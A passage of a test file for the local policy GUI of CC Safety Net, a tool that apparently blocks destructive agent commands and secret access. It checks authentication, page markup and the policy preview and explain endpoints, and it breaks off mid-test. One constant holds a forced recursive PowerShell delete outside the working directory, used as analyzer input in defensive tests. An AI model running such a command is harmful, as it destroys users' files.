import { afterEach, beforeEach, describe, expect, test } from 'bun:test';
import {
  appendFileSync,
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  createPolicyGuiServer,
  fetchHealth,
  fetchIntegrations,
  fetchStarContext,
  runGuiCommand,
  runIntegration,
  starRepo,
  userHasStarredRepo,
} from '@/bin/gui';
import type { InstallAction, InstallTarget } from '@/bin/hook/install/targets';
import { mockVersionFetcher, writeJsonlFixture } from '../helpers';
import { syncInitialGitRulebook } from '../helpers/rulebook';

interface PolicyApiResponse {
  exists: boolean;
  raw: string;
  errors: string[];
  policy: {
    version: number;
  };
  destructiveCommandRules: unknown[];
  secretPatterns: unknown[];
  preview: {
    selectedPreset: string;
    counts: { enabled: number; inheritedRequiresStrict: number; inheritedRequiresParanoid: number };
  } | null;
}

interface WriteApiResponse {
  errors: string[];
}

interface StarContextApiResponse {
  starred: boolean | null;
  starCount: number | null;
  blockedTotal: number;
}

interface ActivityApiResponse {
  days: number;
  logsDir: string | null;
  totalBlockedAllTime: number;
  totalInWindow: number;
  truncated: boolean;
  counts: {
    blocked: number;
    allowed: number;
    sessions: number;
    agents: Record<string, number>;
    blockedByDay: number[];
    rules: Record<string, number>;
    commands: Record<string, number>;
    errors: number;
  };
  entries: { ts: string; command: string }[];
}

interface IntegrationsApiResponse {
  targets: {
    target: string;
    label: string;
    version: string | null;
    status: 'active' | 'disabled' | 'not-installed';
  }[];
  system: { version: string; nodeVersion: string | null; platform: string };
}

interface IntegrationActionApiResponse {
  ok: boolean;
  output: string;
}

const DEFAULT_POLICY_BODY = {
  version: 1,
  safety: { level: 'standard', overrides: {} },
  workflow: { worktree_mode: false },
  destructive_command_protection: { enabled: true, overrides: {} },
  secret_protection: { enabled: true, overrides: {}, deny_paths: [] },
};

describe('policy GUI server', () => {
  let tempDir: string;
  let safetyNetHome: string;

  beforeEach(() => {
    tempDir = mkdtempSync(join(tmpdir(), 'safety-net-gui-'));
    safetyNetHome = join(tempDir, '.cc-safety-net');
  });

  afterEach(() => {
    rmSync(tempDir, { recursive: true, force: true });
  });

  test('binds localhost and rejects missing or wrong tokens', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      expect(server.url.startsWith('http://127.0.0.1:')).toBe(true);
      expect(server.url).toContain(`token=${server.token}`);

      expect((await fetch(`${server.origin}/api/policy`)).status).toBe(403);
      expect((await fetch(`${server.origin}/api/policy?token=wrong`)).status).toBe(403);
      expect((await fetch(`${server.origin}/favicon.ico`)).status).toBe(204);
      expect((await fetch(server.url)).headers.get('cache-control')).toBe('no-store');
    } finally {
      await server.close();
    }
  });

  test('GET root serves the GUI document with bundled custom CSS and token bootstrap', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      const response = await fetch(server.url);
      const html = await response.text();

      expect(response.headers.get('content-type')).toBe('text/html; charset=utf-8');
      expect(html).toContain('<title>CC Safety Net</title>');
      expect(html).toContain(`const token = ${JSON.stringify(server.token)};`);
      expect(html).toContain('cc-safety-net-gui-custom-css');
      expect(html).toContain('role="status"');
      expect(html).toContain('aria-live="polite"');
      expect(html).toContain('id="app-status"');
      // Sidebar shell with hash-routed views; the global status bar sits in the topbar.
      expect(html).toContain('<aside class="sidebar">');
      expect(html).toContain('<nav class="sidenav" aria-label="Sections">');
      expect(html).toContain('data-nav="overview"');
      expect(html).toContain('data-nav="activity"');
      expect(html).toContain('data-nav="policy"');
      expect(html).toContain('data-nav="integrations"');
      expect(html).toContain('data-nav="settings"');
      expect(html).toContain('<link rel="icon" href="data:image/svg+xml,');
      expect(html).toContain('title="Overview"');
      expect(html).toContain('title="Activity"');
      expect(html).toContain('title="Policy"');
      expect(html).toContain('title="Settings"');
      expect(html).toContain('.sr-only-collapse');
      expect(html).toContain('@media (max-width: 900px)');
      expect(html).toContain('repeat(2, minmax(0, 1fr))');
      expect(html).toContain('<section class="view" data-view="overview">');
      expect(html).toContain('<section class="view" data-view="activity" hidden>');
      expect(html).toContain('<section class="view" data-view="policy" hidden>');
      expect(html).toContain('<section class="view" data-view="integrations" hidden>');
      expect(html).toContain('<section class="view" data-view="settings" hidden>');
      expect(html).toContain(
        "const viewNames = ['overview', 'activity', 'policy', 'integrations', 'settings'];",
      );
      expect(html).toContain("requestJson('/api/integrations')");
      expect(html).toContain("window.addEventListener('hashchange', applyView);");
      expect(html).toContain('<header class="topbar" id="topbar">');
      expect(html.indexOf('id="policy-savebar"')).toBeLessThan(html.indexOf('id="save"'));
      expect(html.indexOf('id="save"')).toBeLessThan(html.indexOf('id="reset"'));
      expect(html).toContain('.topbar {\n  position: sticky;');
      // Topbar merges the view title, status chip, and Save; title tracks the route.
      expect(html).toContain('id="topbar-title"');
      expect(html).toContain('const viewTitles = {');
      expect(html).toContain('.topbar-row {');
      expect(html).toContain('document.title = `${viewTitles[view]} · CC Safety Net`;');
      // Overview: stat tiles plus posture cards backed by /api/policy and /api/activity.
      expect(html).toContain('id="overview-tiles"');
      // Overview health strip loads asynchronously after first render via GET /api/health.
      expect(html).toContain('id="health-strip"');
      expect(html).toContain("requestJson('/api/health')");
      // Part 2 replaced the recent-blocks feed with posture + pattern cards.
      expect(html).not.toContain('id="recent-blocks"');
      expect(html).not.toContain('id="view-all-blocks"');
      expect(html).toContain('id="protection-card"');
      expect(html).toContain('const renderProtectionCard = () => {');
      expect(html).toContain('.protection-warning {');
      expect(html).toContain('Destructive command protection is OFF');
      expect(html).toContain('Secret protection is OFF');
      expect(html).toContain('id="top-rules"');
      expect(html).toContain('id="top-commands"');
      // Activity <-> Policy cross-links reuse the rule-id chip as a button in both directions.
      expect(html).toContain('data-rule-activity=');
      expect(html).toContain('data-jump-rule');
      expect(html).toContain('const jumpToActivityRule');
      // Top command drill-down filters the feed by exact signature, blocked-only,
      // so the feed count reconciles with the Top blocked commands tally.
      expect(html).toContain(
        'return commandSignature(entry.segment || entry.command) === activityFilters.command;',
      );
      expect(html).toContain('No blocked commands in this window.');
      expect(html).toContain('id="guard-errors"');
      expect(html).toContain("[chipHtml('decision', 'error', 'Errors', activity.counts.errors)]");
      expect(html).toContain(
        "if (activityFilters.decision === 'error' && !entry.failureStage) return false;",
      );
      expect(html).toContain(
        "if (activityFilters.decision === 'error' && activity.counts.errors === 0) {",
      );
      // Activity: filterable audit feed.
      expect(html).toContain('id="activity-days"');
      expect(html).toContain('id="activity-refresh"');
      expect(html).toContain('id="activity-search"');
      expect(html).toContain('id="activity-decision"');
      expect(html).toContain('id="activity-agents"');
      // Command drill-down from the overview shows as a removable pill, not search text.
      expect(html).toContain('id="activity-command-filter"');
      expect(html).toContain('data-clear-command');
      // Feed rows lead with the offending segment (fallback to the raw command).
      expect(html).toContain("entry.segment || entry.command || '(no command recorded)'");
      expect(html).toContain('placeholder="Filter by rule or command"');
      expect(html).toContain('id="activity-feed"');
      expect(html).toContain('id="activity-count"');
      expect(html).toContain('requestJson(`/api/activity?days=${activityFilters.days}`)');
      expect(html).toContain('const feedItemHtml = (entry, index) => {');
      // Per-entry copy-as-JSON button, matching the raw JSON copy control.
      expect(html).toContain('class="icon-button feed-copy" data-log-copy=');
      expect(html).toContain('JSON.stringify(entry, null, 2)');
      expect(html).toContain(
        "const activityFilters = { days: 7, decision: 'all', agent: 'all', query: '', command: '' };",
      );
      expect(html).toContain('data-activity-chip=');
      // Error badge for fail-closed guard failures (amber, still a deny).
      expect(html).toContain('--warn-fg:');
      expect(html).toContain('.decision-badge.error {');
      expect(html).toContain(
        "const badgeClass = entry.failureStage ? 'error' : deny ? 'deny' : 'allow';",
      );
      // Agent display names; the badge renders only for identified agents.
      expect(html).toContain('const agentLabels = {');
      expect(html).toContain("entry.agent && entry.agent !== 'unknown'");
      // Unattributed logs get no chip; they fall under the "All agents" view.
      expect(html).toContain(".filter((name) => name !== 'unknown')");
      expect(html).toContain('data-chip-value=');
      // Search matches only what the row shows: the rule id and the displayed
      // command (segment, falling back to the raw command). Reason/cwd/agent are
      // excluded so a hit is always visible in the row.
      expect(html).toContain('return [entry.ruleId, entry.segment || entry.command]');
      // Clamp toggle for long feed commands.
      expect(html).toContain('max-height: 7.2em');
      expect(html).toContain('data-feed-toggle');
      expect(html).toContain('Show more');
      expect(html).toContain('.feed-command.expanded {');
      // Day separators in the Activity feed.
      expect(html).toContain('.feed-day-sep {');
      expect(html).toContain('const dayLabel = (ts) => {');
      // Blocks-per-day sparkline built from server counts only.
      expect(html).toContain('const byDay = activity.counts.blockedByDay;');
      expect(html).toContain('Blocked commands per day, most recent');
      expect(html).toContain('<div class="spark-bar" aria-hidden="true"');
      // Settings: file locations, raw JSON, and the danger zone with reset.
      expect(html).toContain('id="logs-path"');
      expect(html).toContain('id="policy-path"');
      expect(html).toContain('<h2>Danger zone</h2>');
      expect(html.indexOf('id="theme-toggle"')).toBeGreaterThan(
        html.indexOf('data-view="settings"'),
      );
      // Part 1: quiet topbar + four-layer unsaved-changes protection stack.
      expect(html).not.toContain('Unsaved changes. Click Save to apply.');
      expect(html).toContain('id="discard-changes"');
      expect(html).toContain('Discard unsaved changes?');
      expect(html).toContain('Changes discarded.');
      expect(html).not.toContain('.app-status .discard-link {');
      expect(html).toContain('No changes to save');
      expect(html).toContain('let dirty = false;');
      expect(html).toContain('const updateDirtyStatus = () => {');
      expect(html).toContain('dirty = draftJson !== JSON.stringify(state.policy);');
      expect(html).toContain("qs('policy-savebar').hidden = !dirty;");
      expect(html).toContain(
        '<div class="policy-savebar" id="policy-savebar" hidden><span>Unsaved changes</span><div class="savebar-actions"><button type="button" id="discard-changes">Discard</button><button class="primary" id="save">Save</button></div></div>',
      );
      expect(html).toContain('id="dirty-chip"');
      expect(html).toContain('Unsaved policy changes · Review');
      expect(html).toContain('.app-status:empty {');
      expect(html).toContain('--topbar-h');
      expect(html).toContain('.policy-savebar {');
      expect(html).toContain("window.addEventListener('beforeunload'");
      expect(html).toContain('cc-safety-net-draft');
      expect(html).toContain('Restored unsaved draft');
      expect(html).toContain("setAppStatus('Repair required', 'error');");
      expect(html).toContain("setAppStatus('');");
      expect(html).toContain('setDetailStatus(');
      expect(html).toContain('Destructive Command Protection');
      expect(html).toContain('Safety preset');
      // Preset status dedupe: text only when customized, hidden when empty.
      expect(html).toContain('#safety-preset-status:empty');
      expect(html).toContain(
        "qs('safety-preset-status').textContent = customized ? `${presetName()} · Customized` : '';",
      );
      expect(html).toContain('Available in every preset');
      expect(html).toContain('Strict tier');
      expect(html).toContain('Paranoid tier');
      expect(html).toContain('Use inherited setting');
      expect(html).toContain(
        '${override && !effective.changesInherited ? `<button type="button" class="inherit-button"',
      );
      expect(html).toContain('Reset rule customizations');
      // Reset button lives at the far right of the panel head, not inside the rules body.
      expect(html).toContain(
        '<button type="button" id="reset-rule-customizations" class="panel-head-action">Reset rule customizations</button>',
      );
      expect(html).not.toContain('rule-customization-actions');
      expect(html.indexOf('id="reset-rule-customizations"')).toBeLessThan(
        html.indexOf('<div id="destructive-command">'),
      );
      expect(html).toContain('id="rule-example-popover"');
      expect(html).toContain('popover="auto"');
      expect(html).toContain('role="dialog"');
      expect(html).toContain('id="rule-example-title"');
      expect(html).toContain('id="rule-example-command"');
      expect(html).toContain('data-rule-example=');
      expect(html).toContain('Show blocked example for');
      expect(html).toContain('const openRuleExample = ');
      expect(html).toContain("qs('rule-example-title').textContent = rule.label;");
      expect(html).toContain("qs('rule-example-command').textContent = rule.example;");
      expect(html).toContain('popover.showPopover();');
      expect(html).toContain('.rule-example-button {');
      expect(html).toContain('.rule-example-popover {');
      expect(html).toContain("requestJson('/api/policy/preview'");
      expect(html).toContain('id="tester-input"');
      expect(html).toContain("requestJson('/api/policy/explain'");
      expect(html).toContain('let previewRequestId = 0;');
      expect(html).toContain('const requestId = ++previewRequestId;');
      expect(html).toContain('if (requestId !== previewRequestId) return false;');
      expect(html).toContain(
        'if (input.checked === preview.rules[ruleId].inheritedEnabled)\n      delete draftPolicy.destructive_command_protection.overrides[ruleId];',
      );
      expect(html).toContain('const tierExpanded = new Map([');
      expect(html).toContain("['strict', false]");
      expect(html).not.toContain("['strict', true]");
      expect(html).toContain('const searchCollapsedTiers = new Set();');
      expect(html).toContain('if (searchActive && expanded) searchCollapsedTiers.add(tier);');
      expect(html).toContain('Destructive command protection');
      expect(html).toContain('Catastrophic and custom rules remain active when disabled.');
      // Catastrophic rules render in a read-only, collapsible "Always enforced" group, not as (locked) toggles.
      expect(html).toContain('rule-tier-enforced');
      expect(html).toContain('>Always enforced<');
      expect(html).toContain('data-tier-toggle="enforced"');
      expect(html).toContain("['enforced', false]");
      expect(html).toContain(
        'const enforcedRules = matchingRules.filter((rule) => rule.catastrophic);',
      );
      expect(html).toContain(
        'const configurableRules = matchingRules.filter((rule) => !rule.catastrophic);',
      );
      expect(html).not.toContain("effective.source === 'catastrophic' ||");
      expect(html).not.toContain('catastrophic protection cannot be disabled');
      expect(html).not.toContain('secret protection unchanged');
      expect(html).toContain('data-destructive-command-enabled');
      expect(html).toContain('id="policy-search"');
      expect(html).toContain('Search all protections');
      expect(html.indexOf('id="policy-search"')).toBeLessThan(html.indexOf('id="reset"'));
      expect(html).toContain('flex: 1 1 240px;');
      expect(html).toContain('max-width: none;');
      // Search lives in the top bar, contextual per view, sticky on mobile.
      expect(html).toContain('class="view-search topbar-search" data-search-view="activity"');
      expect(html).toContain('class="view-search topbar-search" data-search-view="policy"');
      expect(html).toContain('.topbar.has-search {');
      expect(html).toContain("qs('topbar').classList.toggle('has-search', hasSearch)");
      expect(html).not.toContain('appbar');
      expect(html).not.toContain('id="destructive-command-search"');
      expect(html).not.toContain('id="secret-search"');
      expect(html).not.toContain('Search protections');
      expect(html).toContain('#destructive-command > label.row');
      expect(html).toContain('margin-bottom: 16px');
      expect(html).not.toContain(
        'label.row:has(input:checked) {\n  border-color: color-mix(in srgb, var(--accent)',
      );
      expect(html).not.toContain('class="panel foldable"');
      expect(html).not.toContain('destructive-command-panel-content');
      expect(html).toContain('<h2>Destructive Command Protection</h2>');
      expect(html).toContain('<h2>Secret Protection</h2>');
      expect(html).toContain('aria-controls="safety-overrides-content"');
      expect(html).toContain('id="safety-overrides-content" hidden');
      expect(html).toContain('<label class="row safety-override-row">');
      expect(html).toContain('label.row.safety-override-row {\n  display: grid;');
      expect(html).toContain('label.row.safety-override-row select {');
      expect(html).toContain('width: 100%;');
      expect(html).toContain('.panel-toggle {\n  display: inline-flex;');
      expect(html).toContain('font-size: inherit;\n  font-weight: inherit;');
      expect(html).not.toContain('.foldable > .panel-head {');
      expect(html).toContain('data-secret-group-toggle=');
      expect(html).not.toContain('tier-toggle"');
      expect(html).toContain('class="rule-tier-head" data-tier-toggle=');
      expect(html).toContain('class="rule-tier-head" data-secret-group-toggle=');
      expect(html).toContain('.rule-tier-head[aria-expanded="false"] .panel-chevron');
      expect(html).toContain('.rule-tier-head:hover:not(:disabled)');
      // Tier counts trim zero segments and color off/customized.
      expect(html).toContain('const tierCountHtml = (segments) => {');
      expect(html).toContain('[allGroupRules.length - onCount, ');
      expect(html).toContain('.tier-counts .count-off {');
      expect(html).toContain('.tier-counts .count-customized {');
      expect(html).toContain('const secretGroupExpanded = new Map();');
      expect(html).toContain('const searchCollapsedSecretGroups = new Set();');
      expect(html).toContain('Active');
      expect(html).toContain('Disabled');
      expect(html).not.toContain('Paused');
      expect(html).not.toContain('state-paused');
      expect(html).toContain('<dialog class="confirm-dialog" id="confirm-dialog"');
      expect(html).toContain('id="confirm-dialog-title"');
      expect(html).toContain('id="confirm-dialog-confirm"');
      expect(html).toContain('const confirmDialog =');
      expect(html).toContain('showModal()');
      expect(html).toContain("qs('confirm-dialog-detail').parentElement.hidden = !options.detail;");
      expect(html).toContain('const confirmProtectionDisable =');
      expect(html).toContain('Disable destructive command protection?');
      expect(html).toContain('Custom rules remain active.');
      expect(html).toContain(
        'Configurable protection disabled. Catastrophic protections remain active; saved rule settings and allow paths are preserved.',
      );
      expect(html).toContain('id="allow-paths-input"');
      expect(html).toContain('id="allow-paths-list"');
      expect(html).toContain('data-path-add="allow-paths"');
      expect(html).toContain(
        '`${preview.counts.enabled} active, ${preview.counts.disabled} disabled`',
      );
      expect(html).not.toContain('require Strict ·');
      expect(html).not.toContain('require Paranoid ·');
      expect(html).not.toContain('user-disabled`');
      expect(html).toContain('Disable secret protection?');
      expect(html).toContain(
        'Default sensitive paths, coding CLI credential locations, and deny paths will stop blocking access until you turn this back on.',
      );
      expect(html).not.toContain('Configured deny paths are part of Secret protection.');
      expect(html).toContain('input.checked = true;');
      expect(html).toContain("confirmLabel: 'Reset policy'");
      expect(html).not.toContain('Confirm reset');
      expect(html).not.toContain('Search secret patterns');
      expect(html).toContain('Default sensitive paths');
      expect(html).toContain(
        'Block default sensitive paths, coding CLI credential locations, and configured deny paths.',
      );
      expect(html).not.toContain(
        'Block default sensitive path patterns and configured deny paths.',
      );
      expect(html).toContain(
        'Configured paths and everything inside them are blocked while Secret protection is on.',
      );
      expect(html).not.toContain('Deny paths remain active');
      expect(html).not.toContain('Deny paths are always blocked');
      expect(html).not.toContain('trusted user policy');
      expect(html).toContain('const disabled = !draftPolicy.secret_protection.enabled;');
      expect(html).not.toContain("qs('deny-paths')");
      expect(html).not.toContain('One path per line');
      expect(html).toContain('id="deny-paths-input"');
      expect(html).toContain('id="deny-paths-add-button"');
      expect(html).toContain('id="deny-paths-list"');
      expect(html).toContain('id="deny-paths-hint"');
      expect(html).toContain('const createPathList = ');
      expect(html).toContain('const pathLists = {');
      expect(html).toContain('data-path-remove');
      expect(html).toContain('No ${config.itemLabel}s configured.');
      expect(html).toContain('id="deny-paths-count"');
      expect(html).toContain("`${paths.length} path${paths.length === 1 ? '' : 's'}`");
      expect(html).toContain('Already listed:');
      expect(html).toContain('Remove ${config.itemLabel} ${escapeHtml(path)}');
      expect(html).toContain('const pathListIcons =');
      expect(html).toContain('aria-label="Add deny path"');
      expect(html).toContain('aria-label="Add allow path"');
      expect(html).toContain('Recursive deletes targeting these paths are not blocked, like /tmp.');
      expect(html).toContain('validateAdditions: async (paths) => {');
      expect(html).not.toContain('>Add</button>');
      expect(html).not.toContain('>Remove</button>');
      expect(html).toContain('event.clipboardData');
      expect(html).toContain('deny_paths: draftPolicy.secret_protection.deny_paths');
      expect(html).not.toContain('updateDraftSecretPaths');
      expect(html).not.toContain('textarea:disabled:hover');
      expect(html).toContain('cursor: not-allowed');
      expect(html).toContain("if (input.id === 'policy-search') {");
      expect(html).not.toContain('searchPanelIds');
      expect(html).toContain('let searchActive = false;');
      expect(html).not.toContain('searchExpandedPanels');
      expect(html).toContain('const syncSearchState = () => {');
      expect(html).toContain('if (active === searchActive) return;');
      expect(html).toContain('searchCollapsedSecretGroups.clear();');
      expect(html).toContain(
        'if (searchActive && expanded) searchCollapsedSecretGroups.add(category);',
      );
      expect(html).toContain('renderDestructiveCommands();');
      expect(html).toContain('renderSecretPatterns();');
      expect(html).toContain(
        '<strong>${escapeHtml(rule.label)}</strong>\n              <button type="button" class="rule-id" data-rule-activity="${escapeHtml(rule.id)}" title="Show recent blocks in Activity">${escapeHtml(rule.id)}</button>',
      );
      expect(html).not.toContain(
        '<strong>${escapeHtml(rule.label)}</strong> <button type="button" class="rule-id" data-rule-activity="${escapeHtml(rule.id)}"',
      );
      expect(html).toContain(':is(label.row, .rule-control) .rule-id {');
      expect(html).toContain('display: block;');
      expect(html).toContain(
        'font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;',
      );
      expect(html).toContain('word-break: break-all;');
      expect(html).toContain('syncRawFromForm();');
      expect(html).not.toContain('secret-panel-content');
      expect(html).toContain('aria-expanded="false" aria-controls="deny-paths-content"');
      expect(html).toContain('id="deny-paths-content" hidden');
      expect(html).toContain('aria-expanded="false" aria-controls="allow-paths-content"');
      expect(html).toContain('id="allow-paths-content" hidden');
      expect(html).toContain('Policy JSON');
      expect(html).toContain(
        '<div class="panel-head raw-json-head">\n              <div class="panel-title">\n                <h2>Policy JSON</h2>',
      );
      expect(html).toContain('.raw-json-head {\n  flex-wrap: nowrap;');
      expect(html).toContain('.raw-json-head .panel-title {');
      expect(html).toContain('.raw-json-head #raw-copy {');
      // raw-json-head and the Configure link's head stay row on mobile.
      expect(html).toContain('.panel-head:has(.view-all-link) {');
      expect(html).toContain('flex-direction: row;');
      expect(html).toContain('id="raw-copy"');
      expect(html).toContain('aria-label="Copy raw JSON to clipboard"');
      expect(html).toContain('id="repair"');
      expect(html).toContain('>Repair</button>');
      expect(html).toContain('readonly></textarea>');
      expect(html).toContain('Read-only mirror of the policy controls.');
      expect(html).toContain('<div class="star-row" id="star-row" hidden>');
      expect(html).toContain('<span id="star-pitch-text"></span>');
      expect(html).toContain('<span class="star-mechanism" id="star-mechanism" hidden>');
      expect(html).toContain('One click via your GitHub CLI. No redirect.');
      expect(html).toContain('<span id="star-slot"></span>');
      // The star CTA lives on the Overview view; repo links live in the sidebar footer.
      expect(html.indexOf('id="star-row"')).toBeGreaterThan(html.indexOf('data-view="overview"'));
      expect(html.indexOf('id="star-row"')).toBeLessThan(html.indexOf('data-view="activity"'));
      expect(html).not.toContain('page-footer');
      expect(html).toContain('<div class="sidebar-links">');
      expect(html).toContain(
        '<a href="https://github.com/kenryu42/cc-safety-net" target="_blank" rel="noopener">GitHub</a>',
      );
      expect(html).toContain(
        '<a href="https://ccsafetynet.com/docs" target="_blank" rel="noopener">Documentation</a>',
      );
      expect(html).toContain('If CC Safety Net is useful to you, star it on GitHub.');
      expect(html).toContain('const starIcons =');
      expect(html).not.toContain('id="star-repo"');
      expect(html).not.toContain('starCtaDismissedKey');
      expect(html).toContain('const formatStarCount = (count) => {');
      expect(html).toContain(
        "if (count >= 1000) return `${(count / 1000).toFixed(1).replace(/\\.0$/, '')}k`;",
      );
      expect(html).toContain('const renderStarCta = (context) => {');
      expect(html).toContain('if (context.starred === true) {');
      expect(html).not.toContain('localStorage.getItem(starCtaDismissedKey)');
      expect(html).toContain(
        'aria-label="Star CC Safety Net on GitHub. One click via your GitHub CLI."',
      );
      expect(html).toContain(
        "CC Safety Net has blocked <strong>${escapeHtml(context.blockedTotal.toLocaleString('en-US'))}</strong> risky command${context.blockedTotal === 1 ? ",
      );
      expect(html).toContain("qs('star-mechanism').hidden = context.starred !== false;");
      expect(html).toContain('if (context.starred === null) {');
      expect(html).toContain('renderStarLink(context);');
      expect(html).toContain('const renderStarPitch = (context, starred = false) => {');
      expect(html).toContain('${evidence} If it saved your work, star it on GitHub.');
      expect(html).toContain('renderStarPitch(activeStarContext, true);');
      expect(html).toContain('target="_blank" rel="noopener"');
      expect(html).toContain('aria-label="Star CC Safety Net on GitHub (opens github.com)"');
      expect(html).not.toContain('aria-label="Hide star button"');
      expect(html).not.toContain('star-dismiss');
      expect(html).toContain(
        "const fallbackRepoUrl = 'https://github.com/kenryu42/cc-safety-net';",
      );
      expect(html).toContain("const result = await requestJson('/api/star', { method: 'POST' });");
      expect(html).toContain(
        "button.querySelector('.star-label').textContent = 'Starred. Thank you.';",
      );
      expect(html).toContain(
        'renderStarLink(activeStarContext, result.data?.fallbackUrl ?? fallbackRepoUrl);',
      );
      expect(html).not.toContain('window.location.href');
      expect(html).not.toContain('Could not star via GitHub CLI (gh missing or not authenticated)');
      expect(html).not.toContain('window.open(');
      expect(html).not.toContain("window.open('', '_blank')");
      expect(html).toContain("setAppStatus('Starred on GitHub', 'ok');");
      expect(html).toContain('.sidebar-links {');
      expect(html).toContain('.sidebar-links a {');
      expect(html).toContain('.tiles {');
      expect(html).toContain('.tile {');
      expect(html).toContain('.feed-item {');
      expect(html).toContain('.feed-command {');
      expect(html).toContain('.decision-badge {');
      expect(html).toContain('.agent-badge {');
      expect(html).toContain('button.chip {');
      expect(html).toContain('.star-row {');
      expect(html).toContain('.star-pitch {');
      expect(html).toContain('.star-mechanism {');
      expect(html).toContain('.star-cta {');
      expect(html).toContain('.star-icon {');
      expect(html).not.toContain('.star-copy {');
      expect(html).toContain('.star-count {');
      expect(html).not.toContain('.star-dismiss {');
      expect(html).toContain('border-color: var(--border-strong);');
      expect(html).not.toContain('background: var(--star-bg);');
      expect(html).not.toContain('border-color: var(--star-border);');
      expect(html).not.toContain('.star-cta {\n    align-self: center;');
      expect(html).toContain('.star-cta.starred:disabled {');
      expect(html).toContain('cursor: default;');
      expect(html).toContain('.star-row .star-cta,\n  .star-row #star-slot {');
      expect(html).toContain('#star-slot {');
      expect(html).toContain('white-space: nowrap;');
      expect(html).toContain('href="${escapeHtml(href)}"');
      expect(html).not.toContain('rawIsManual');
      expect(html).not.toContain("if (input.id === 'raw')");
      expect(html).not.toContain("JSON.parse(qs('raw')");
      expect(html).toContain('const rawCopyIcons =');
      expect(html).toContain("navigator.clipboard.writeText(qs('raw').value)");
      expect(html).toContain("qs('raw-copy').classList.toggle('copied', copied);");
      expect(html).toContain(
        'rawCopyResetTimer = setTimeout(() => setRawCopyCopied(false), 2000);',
      );
      expect(html).not.toContain(
        'button.icon-button.copied {\n  color: var(--ok-fg);\n  border-color',
      );
      expect(html).not.toContain(' · ${escapeHtml(rule.id)} · ');
    } finally {
      await server.close();
    }
  });

  test('GET api policy returns defaults for missing file and errors for invalid file', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      const missing = await getJson<PolicyApiResponse>(
        `${server.origin}/api/policy?token=${server.token}`,
      );
      expect(missing.exists).toBe(false);
      expect(missing.errors).toEqual([]);
      expect(missing.policy.version).toBe(1);
      expect(missing.destructiveCommandRules.length).toBeGreaterThan(0);
      expect(missing.secretPatterns.length).toBeGreaterThan(0);
      expect(missing.preview).toMatchObject({
        selectedPreset: 'standard',
        counts: { enabled: 45, inheritedRequiresStrict: 5, inheritedRequiresParanoid: 3 },
      });

      mkdirSync(safetyNetHome, { recursive: true });
      writeFileSync(join(safetyNetHome, 'policy.json'), '{bad json', 'utf-8');

      const invalid = await getJson<PolicyApiResponse>(
        `${server.origin}/api/policy?token=${server.token}`,
      );
      expect(invalid.exists).toBe(true);
      expect(invalid.raw).toBe('{bad json');
      expect(invalid.errors[0]).toContain('Invalid JSON');
    } finally {
      await server.close();
    }
  });

  test('POST api policy preview resolves draft overrides without writing', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      expect(
        (
          await fetch(`${server.origin}/api/policy/preview`, {
            method: 'POST',
            body: '{}',
          })
        ).status,
      ).toBe(403);
      const invalidResponse = await fetch(
        `${server.origin}/api/policy/preview?token=${server.token}`,
        {
          method: 'POST',
          headers: {
            'content-type': 'application/json',
            'x-cc-safety-net-token': server.token,
          },
          body: JSON.stringify({
            ...DEFAULT_POLICY_BODY,
            destructive_command_protection: {
              enabled: true,
              overrides: { 'shell.dynamic-executable': 'maybe' },
            },
          }),
        },
      );
      expect(invalidResponse.status).toBe(400);
      expect(await invalidResponse.json()).toMatchObject({
        errors: [expect.stringContaining('must be "on" or "off"')],
      });
      const result = await postJson<{
        errors: string[];
        preview: {
          selectedPreset: string;
          counts: { enabled: number; explicitOn: number; effectiveCustomizations: number };
          rules: Record<string, { enabled: boolean; source: string }>;
        };
      }>(`${server.origin}/api/policy/preview?token=${server.token}`, server.token, {
        ...DEFAULT_POLICY_BODY,
        destructive_command_protection: {
          enabled: true,
          overrides: { 'shell.dynamic-executable': 'on' },
        },
      });

      expect(result.errors).toEqual([]);
      expect(result.preview.selectedPreset).toBe('standard');
      expect(result.preview.counts).toMatchObject({
        enabled: 46,
        explicitOn: 1,
        effectiveCustomizations: 1,
      });
      expect(result.preview.rules['shell.dynamic-executable']).toMatchObject({
        enabled: true,
        source: 'rule_override',
      });
      expect(existsSync(join(safetyNetHome, 'policy.json'))).toBe(false);
    } finally {
      await server.close();
    }
  });

  // A PowerShell rule the standard preset enforces but a draft override can toggle; the string is
  // analyzer input only and is never executed.
  const TOGGLE_RULE_ID = 'powershell.remove-item-recursive-force-outside-cwd';
  const TOGGLE_COMMAND = 'Remove-Item ../outside -Recurse -Force';

  test('POST api policy explain evaluates the draft without writing', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      expect(
        (
          await fetch(`${server.origin}/api/policy/explain?token=${server.token}`, {
            method: 'POST',
            body: JSON.stringify({ command: TOGGLE_COMMAND, policy: DEFAULT_POLICY_BODY }),
          })
        ).status,
      ).toBe(403);

      const missingCommand = await fetch(
        `${server.origin}/api/policy/explain?token=${server.token}`,
        {
          method: 'POST',
          headers: { 'content-type': 'application/json', 'x-cc-safety-net-token': server.token },
          body: JSON.stringify({ policy: DEFAULT_POLICY_BODY }),
        },
      );
      expect(missingCommand.status).toBe(400);
      expect(await missingCommand.json()).toEqual({ errors: ['command must be a string'] });

      const nullBody = await fetch(`${server.origin}/api/policy/explain?token=${server.token}`, {
        method: 'POST',
        headers: { 'content-type': 'application/json', 'x-cc-safety-net-token': server.token },
        body: 'null',
      });
      expect(nullBody.status).toBe(400);
      expect(await nullBody.json()).toEqual({ errors: ['command must be a string'] });

      const invalidPolicy = await fetch(
        `${server.origin}/api/policy/explain?token=${server.token}`,
        {
          method: 'POST',
          headers: { 'content-type': 'application/json', 'x-cc-safety-net-token': server.token },
          body: JSON.stringify({
            command: TOGGLE_COMMAND,
            policy: {
              ...DEFAULT_POLICY_BODY,
              destructive_command_protection: {
                enabled: true,
                overrides: { [TOGGLE_RULE_ID]: 'maybe' },
              },
            },
          }),
        },
      );
      expect(invalidPolicy.status).toBe(400);
      expect(await invalidPolicy.json()).toMatchObject({
